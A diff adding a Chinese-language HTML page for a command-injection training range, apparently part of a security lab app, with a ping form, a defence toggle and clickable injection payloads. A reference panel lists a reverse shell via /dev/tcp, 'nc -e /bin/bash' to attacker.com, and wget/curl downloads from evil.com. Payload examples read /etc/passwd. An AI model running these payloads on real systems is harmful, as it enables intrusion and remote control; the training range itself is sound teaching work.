@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <title>命令注入测试靶场</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
+  <style>
+    body { 
+      background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .attack-card {
+      background: rgba(255,255,255,0.95);
+      border-radius: 16px;
+      padding: 24px;
+      margin-bottom: 20px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+    }
+    .attack-card h3 { color: #fa709a; margin-bottom: 16px; }
+    .payload-example {
+      background: #f8f9fa;
+      border-left: 4px solid #fa709a;
+      padding: 12px;
+      border-radius: 4px;
+      margin: 8px 0;
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .payload-example:hover {
+      background: #e9ecef;
+      transform: translateX(4px);
+    }
+    .result-box {
+      background: #fff;
+      border: 1px solid #dee2e6;
+      border-radius: 8px;
+      padding: 16px;
+      margin-top: 16px;
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+      max-height: 400px;
+      overflow-y: auto;
+    }
+    .result-box.blocked {
+      border-left: 4px solid #ffc107;
+      background: #fff8e1;
+    }
+    .result-box.success {
+      border-left: 4px solid #28a745;
+      background: #f0fff4;
+    }
+    .terminal-output {
+      background: #1e1e1e;
+      color: #00ff00;
+      padding: 16px;
+      border-radius: 8px;
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" style="max-width: 1400px;">
+    <div class="text-center mb-4">
+      <h1 class="text-white mb-2"><i class="bi bi-terminal"></i> 命令注入测试靶场</h1>
+      <p class="text-white-50">测试操作系统命令注入攻击及防御机制</p>
+      <span class="badge bg-danger">💉 注入类攻击</span>
+      <span class="badge bg-warning text-dark">严重程度: CRITICAL</span>
+    </div>
+
+    <div class="row">
+      <div class="col-md-6">
+        <div class="attack-card">
+          <h3><i class="bi bi-hdd-network"></i> Ping 工具测试</h3>
+          <p class="small text-muted">模拟网络诊断工具，测试命令注入漏洞</p>
+          
+          <div class="mb-3">
+            <label class="form-label small">目标主机 IP/域名</label>
+            <input type="text" id="pingInput" class="form-control" placeholder="例如: 127.0.0.1">
+          </div>
+          
+          <div class="row mb-3">
+            <div class="col-md-6">
+              <label class="form-label small">模拟IP地址</label>
+              <input type="text" id="simulatedIp" class="form-control form-control-sm" placeholder="留空使用真实IP">
+              <small class="text-muted">例: 10.0.0.50</small>
+            </div>
+            <div class="col-md-6">
+              <label class="form-label small">防御开关</label>
+              <div class="form-check form-switch">
+                <input class="form-check-input" type="checkbox" id="defenseSwitch" checked>
+                <label class="form-check-label small" for="defenseSwitch">
+                  <span id="defenseSwitchLabel">防御已开启</span>
+                </label>
+              </div>
+              <small class="text-muted">关闭后可查看攻击效果</small>
+            </div>
+          </div>
+          
+          <button id="pingBtn" class="btn btn-danger btn-sm w-100 mb-3">
+            <i class="bi bi-play-circle"></i> 执行 Ping
+          </button>
+          
+          <div class="mb-3">
+            <strong class="small">常见命令注入 Payload:</strong>
+            <div class="payload-example" data-payload="127.0.0.1; cat /etc/passwd">
+              <strong>读取密码文件:</strong> 127.0.0.1; cat /etc/passwd
+            </div>
+            <div class="payload-example" data-payload="127.0.0.1; whoami">
+              <strong>查看当前用户:</strong> 127.0.0.1; whoami
+            </div>
+            <div class="payload-example" data-payload="127.0.0.1 && ls -la">
+              <strong>列举目录:</strong> 127.0.0.1 && ls -la
+            </div>
+            <div class="payload-example" data-payload="127.0.0.1 | id">
+              <strong>查看用户ID:</strong> 127.0.0.1 | id
+            </div>
+            <div class="payload-example" data-payload="127.0.0.1; uname -a">
+              <strong>系统信息:</strong> 127.0.0.1; uname -a
+            </div>
+            <div class="payload-example" data-payload="127.0.0.1; env">
+              <strong>环境变量:</strong> 127.0.0.1; env
+            </div>
+            <div class="payload-example" data-payload="127.0.0.1; ps aux">
+              <strong>进程列表:</strong> 127.0.0.1; ps aux
+            </div>
+            <div class="payload-example" data-payload="127.0.0.1; netstat -an">
+              <strong>网络连接:</strong> 127.0.0.1; netstat -an
+            </div>
+            <div class="payload-example" data-payload="127.0.0.1; ifconfig">
+              <strong>网络配置:</strong> 127.0.0.1; ifconfig
+            </div>
+            <div class="payload-example" data-payload="127.0.0.1; ip addr">
+              <strong>网络配置(Linux ip addr):</strong> 127.0.0.1; ip addr
+            </div>
+            <div class="payload-example" data-payload="127.0.0.1; ipconfig">
+              <strong>网络配置(Windows ipconfig):</strong> 127.0.0.1; ipconfig
+            </div>
+            <div class="payload-example" data-payload="127.0.0.1`pwd`">
+              <strong>当前目录:</strong> 127.0.0.1`pwd`
+            </div>
+          </div>
+          
+          <div id="pingResult" class="result-box" style="display:none;"></div>
+        </div>
+      </div>
+
+      <div class="col-md-6">
+        <div class="attack-card">
+          <h3><i class="bi bi-shield-check"></i> 防御状态监控</h3>
+          <p class="small text-muted">实时显示命令注入检测和拦截情况</p>
+          
+          <div id="defenseStatus" class="alert alert-info">
+            <strong>防御系统:</strong> <span id="defenseState">等待测试...</span>
+          </div>
+          
+          <div class="mb-3">
+            <strong class="small">攻击检测详情:</strong>
+            <div id="attackDetails" class="mt-2" style="font-size: 13px;">
+              <p class="text-muted">暂无检测记录</p>
+            </div>
+          </div>
+          
+          <div class="mb-3">
+            <strong class="small">命令注入类型分类:</strong>
+            <ul class="small mt-2">
+              <li><strong>分号注入:</strong> ; command</li>
+              <li><strong>管道符注入:</strong> | command</li>
+              <li><strong>逻辑运算符:</strong> && command, || command</li>
+              <li><strong>反引号执行:</strong> `command`</li>
+              <li><strong>命令替换:</strong> $(command)</li>
+              <li><strong>重定向注入:</strong> > file, < file</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="attack-card">
+          <h3><i class="bi bi-info-circle"></i> 危险命令示例</h3>
+          <div class="terminal-output">
+# 信息收集
+whoami          # 当前用户
+id              # 用户ID和组
+uname -a        # 系统信息
+cat /etc/passwd # 用户列表
+
+# 文件操作
+ls -la          # 列举文件
+cat file.txt    # 读取文件
+rm -rf /path    # 删除文件
+
+# 网络操作
+wget http://evil.com/shell.sh
+curl http://evil.com/backdoor
+nc -e /bin/bash attacker.com 4444
+
+# 反弹Shell
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="text-center mt-4">
+      <a href="{{ url_for('attack_hub') }}" class="btn btn-outline-light btn-sm me-2">返回攻击中心</a>
+      <a href="{{ url_for('console') }}" class="btn btn-outline-light btn-sm">控制台</a>
+    </div>
+  </div>
+
+  <script>
+    // 防御开关切换
+    document.getElementById('defenseSwitch').addEventListener('change', (e) => {
+      const label = document.getElementById('defenseSwitchLabel');
+      if (e.target.checked) {
+        label.textContent = '防御已开启';
+        label.classList.remove('text-danger');
+        label.classList.add('text-success');
+      } else {
+        label.textContent = '防御已关闭';
+        label.classList.remove('text-success');
+        label.classList.add('text-danger');
+      }
+    });
+    
+    document.querySelectorAll('.payload-example').forEach(el => {
+      el.addEventListener('click', () => {
+        document.getElementById('pingInput').value = el.dataset.payload;
+      });
+    });
+
+    document.getElementById('pingBtn').addEventListener('click', async () => {
+      const target = document.getElementById('pingInput').value;
+      const defenseEnabled = document.getElementById('defenseSwitch').checked;
+      const simulatedIp = document.getElementById('simulatedIp').value.trim();
+      const resultEl = document.getElementById('pingResult');
+      const statusEl = document.getElementById('defenseStatus');
+      const detailsEl = document.getElementById('attackDetails');
+      const stateEl = document.getElementById('defenseState');
+      
+      if (!target) {
+        alert('请输入目标主机');
+        return;
+      }
+      
+      resultEl.style.display = 'block';
+      resultEl.className = 'result-box';
+      resultEl.innerHTML = '<div class="text-center"><div class="spinner-border spinner-border-sm"></div> 执行中...</div>';
+      
+      try {
+        const r = await fetch('/attack/cmdi/ping', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            target: target,
+            defense_enabled: defenseEnabled,
+            simulated_ip: simulatedIp
+          })
+        });
+        
+        const data = await r.json();
+        
+        if (data.blocked) {
+          resultEl.className = 'result-box blocked';
+          statusEl.className = 'alert alert-warning';
+          stateEl.innerHTML = '<i class="bi bi-shield-fill-exclamation"></i> 攻击已拦截';
+          
+          detailsEl.innerHTML = `
+            <div class="alert alert-warning mb-2">
+              <strong>检测到攻击:</strong> ${data.attack_type || '命令注入'}
+            </div>
+            <div><strong>攻击描述:</strong> ${data.description || '未知'}</div>
+            <div><strong>严重程度:</strong> <span class="badge bg-danger">${data.severity || 'CRITICAL'}</span></div>
+            <div><strong>攻击分类:</strong> <span class="badge bg-info">${data.category || '注入类攻击'}</span></div>
+          `;
+          
+          resultEl.innerHTML = `
+            <div class="alert alert-warning">
+              <i class="bi bi-shield-exclamation"></i> <strong>命令注入攻击已被拦截！</strong>
+            </div>
+            <p><strong>检测到的攻击模式:</strong> ${data.description}</p>
+            <p class="text-muted small">恶意命令已被阻止，系统未受影响。</p>
+          `;
+        } else if (data.error) {
+          resultEl.className = 'result-box error';
+          resultEl.innerHTML = `<div class="alert alert-danger">${data.error}</div>`;
+        } else {
+          resultEl.className = 'result-box success';
+          statusEl.className = 'alert alert-success';
+          stateEl.innerHTML = '<i class="bi bi-check-circle"></i> 执行成功';
+          
+          let statusInfo = '';
+          let alertClass = 'success';
+          let alertMsg = 'Ping 执行成功';
+          
+          if (!data.defense_enabled) {
+            statusInfo = '<div class="alert alert-danger mb-2"><i class="bi bi-shield-slash"></i> <strong>防御已关闭</strong> - 命令未被拦截（靶场环境）</div>';
+            
+            if (data.attack_detected) {
+              alertClass = 'danger';
+              alertMsg = '⚠️ 命令注入成功！恶意命令已执行';
+              detailsEl.innerHTML = '<p class="text-danger"><strong>检测到命令注入攻击</strong> - 防御关闭，命令已执行（仅在靶场内）</p>';
+            } else {
+              detailsEl.innerHTML = '<p class="text-warning">⚠️ 防御关闭，命令已执行（仅在靶场内）</p>';
+            }
+          } else {
+            detailsEl.innerHTML = '<p class="text-success">✓ 未检测到命令注入</p>';
+          }
+          
+          if (data.simulated_ip) {
+            statusInfo += `<div class="alert alert-info mb-2"><i class="bi bi-router"></i> 模拟IP: <strong>${data.simulated_ip}</strong></div>`;
+          }
+          
+          resultEl.innerHTML = statusInfo + `
+            <div class="alert alert-${alertClass} mb-2">${alertMsg}</div>
+            <pre style="background: #1e1e1e; color: #d4d4d4; padding: 12px; border-radius: 4px; font-size: 12px; max-height: 400px; overflow-y: auto;">${data.output}</pre>
+          `;
+        }
+      } catch(e) {
+        resultEl.className = 'result-box error';
+        resultEl.innerHTML = `<div class="alert alert-danger">请求失败: ${e.message}</div>`;
+      }
+    });
+  </script>
+</body>
+</html>
